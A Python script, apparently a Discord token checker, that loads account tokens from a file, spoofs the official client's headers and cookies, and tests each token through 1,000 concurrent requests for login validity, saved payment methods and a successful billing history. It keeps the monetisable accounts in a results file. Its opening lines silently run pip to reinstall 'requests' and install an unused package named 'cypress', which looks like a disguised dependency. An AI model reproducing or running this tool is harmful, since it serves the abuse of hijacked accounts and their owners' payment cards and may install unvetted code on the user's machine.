import os 
try:
    import requests
    import cypress
except:
    os.system('pip uninstall requests -y && pip uninstall cypress -y && pip install requests && pip install cypress')
    import requests
    import cypress
try:
    os.system('pip install colorama && pip install requests && pip install aiohttp && pip install asyncio && pip install tasksio && cls')
except:
    pass

import requests
import sys
import logging
import asyncio
import aiohttp
import tasksio



logging.basicConfig(
    level=logging.INFO,
    format="\x1b[38;5;9m[\x1b[0m%(asctime)s\x1b[38;5;9m]\x1b[0m %(message)s\x1b[0m",
    datefmt="%H:%M:%S"
)

class Discord(object):

    def __init__(self):
        if sys.platform == "linux":
            self.clear = lambda: os.system("clear")
        else:
            self.clear = lambda: os.system("cls")

        self.tokens = []

        try:
            for line in open("tokens.txt"):
                self.tokens.append(line.replace("\n", ""))
        except Exception:
            open("tokens.txt", "a+").close()
            logging.info("Please insert your tokens \x1b[38;5;9m(\x1b[0mtokens.txt\x1b[38;5;9m)\x1b[0m")
            sys.exit()

    def headers(self, token: str):
        headers = {
            "Authorization": token,
            "accept": "*/*",
            "accept-language": "en-US",
            "connection": "keep-alive",
            "cookie": "__cfduid=%s; __dcfduid=%s; locale=en-US" % (os.urandom(43).hex(), os.urandom(32).hex()),
            "DNT": "1",
            "origin": "https://discord.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "referer": "https://discord.com/channels/@me",
            "TE": "Trailers",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
        }
        return headers

    async def login(self, token: str):
        try:
            async with aiohttp.ClientSession(headers=self.headers(token)) as client:
                async with client.get("https://discord.com/api/v9/users/@me/library") as response:
                    if response.status == 200:
                        logging.info("Successfully logged in \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                    if response.status == 401:
                        logging.info("Invalid account \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        self.tokens.remove(token)
                    if response.status == 403:
                        logging.info("Locked account \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        self.tokens.remove(token)
        except Exception:
            await self.login(token)

    async def payment_sources(self, token: str):
        try:
            async with aiohttp.ClientSession(headers=self.headers(token)) as client:
                async with client.get("https://discord.com/api/v9/users/@me/billing/payment-sources") as response:
                    json = await response.json()
                    if json != []:
                        valid = 0
                        for source in json:
                            if source["invalid"] == False:
                                valid += 1
                        if valid != 0:
                            logging.info("%s valid payment method(s) \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (valid, token[:59]))
                        else:
                            self.tokens.remove(token)
                    else:
                        logging.info("No payment source(s) \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        self.tokens.remove(token)
        except Exception:
            await self.payment_sources(token)

    async def billing_history(self, token: str):
        try:
            async with aiohttp.ClientSession(headers=self.headers(token)) as client:
                async with client.get("https://discord.com/api/v9/users/@me/billing/payments?limit=1") as response:
                    json = await response.json()
                    if json != []:
                        if json[0]["status"] == 1:
                            logging.info("Latest payment was successfull \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        else:
                            logging.info("Latest payment was declined \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                            self.tokens.remove(token)
                    else:
                        logging.info("No billing history \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                        self.tokens.remove(token)
        except Exception:
            await self.billing_history(token)

    async def start(self):
        if len(self.tokens) == 0:
            logging.info("No tokens loaded.")
            sys.exit()

        async with tasksio.TaskPool(1_000) as pool:
            for token in self.tokens:
                await pool.put(self.login(token))

        print()
        logging.info("Checking payment sources.")
        print()

        async with tasksio.TaskPool(1_000) as pool:
            for token in self.tokens:
                await pool.put(self.payment_sources(token))

        print()
        logging.info("Checking payment history.")
        print()

        async with tasksio.TaskPool(1_000) as pool:
            for token in self.tokens:
                await pool.put(self.billing_history(token))

        with open("results.txt", "a+") as f:
            for token in self.tokens:
                f.write("%s\n" % (token))

if __name__ == "__main__":
    client = Discord()
    asyncio.get_event_loop().run_until_complete(client.start())
